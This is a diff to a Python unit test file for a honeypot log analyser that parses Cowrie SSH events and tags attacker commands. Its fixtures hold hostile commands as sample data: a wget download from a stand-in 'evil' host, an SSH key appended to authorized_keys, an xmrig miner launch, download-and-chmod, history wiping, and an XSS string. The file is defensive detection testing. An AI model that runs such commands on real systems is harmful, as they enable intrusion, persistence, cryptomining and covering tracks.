@@ -8,7 +8,7 @@ from datetime import datetime
 
 import utils.i18n as i18n
 from detector.dashboard import create_server
-from detector.honeypot import load_cowrie, summarize_honeypot
+from detector.honeypot import classify, load_cowrie, summarize_honeypot
 
 i18n.set_lang("en")
 XSS = "<script>alert(1)</script>"
@@ -25,7 +25,7 @@ def _events():
         dict(base, eventid="cowrie.login.success", username="root", password=XSS),
         dict(base, eventid="cowrie.command.input", input="uname -a"),
         dict(base, eventid="cowrie.command.input", input="wget http://evil/x.sh"),
-        dict(base, eventid="cowrie.session.file_download", url="http://evil/x.sh"),
+        dict(base, eventid="cowrie.session.file_download", url="http://evil/x.sh", shasum="a" * 64),
     ]
 
 
@@ -49,6 +49,21 @@ class TestHoneypot(unittest.TestCase):
         self.assertEqual(s["passwords"][0], ["123456", 2])
         self.assertEqual(s["shell_ips"], ["5.6.7.8"])
         self.assertEqual(s["recent_commands"][0]["command"], "wget http://evil/x.sh")
+
+    def test_classify(self):
+        self.assertEqual(classify("uname -a"), ["recon"])
+        self.assertIn("ssh_key", classify('echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys'))
+        self.assertIn("miner", classify("./xmrig -o stratum+tcp://pool"))
+        self.assertIn("download_exec", classify("wget http://x/y.sh; chmod +x y.sh"))
+        self.assertIn("cleanup", classify("rm -rf /tmp/y.sh; history -c"))
+        self.assertEqual(classify("echo hello"), [])
+
+    def test_behaviours_and_hashes(self):
+        s = self.summary()
+        self.assertIn(["recon", 1], s["behaviours"])
+        self.assertIn(["download_exec", 1], s["behaviours"])
+        self.assertEqual(s["hashes"], [["a" * 64, 1]])
+        self.assertEqual(s["recent_commands"][0]["tags"], ["download_exec"])
 
     def test_missing_file_is_ignored(self):
         self.assertEqual(load_cowrie(["/nonexistent/cowrie.json"]), [])
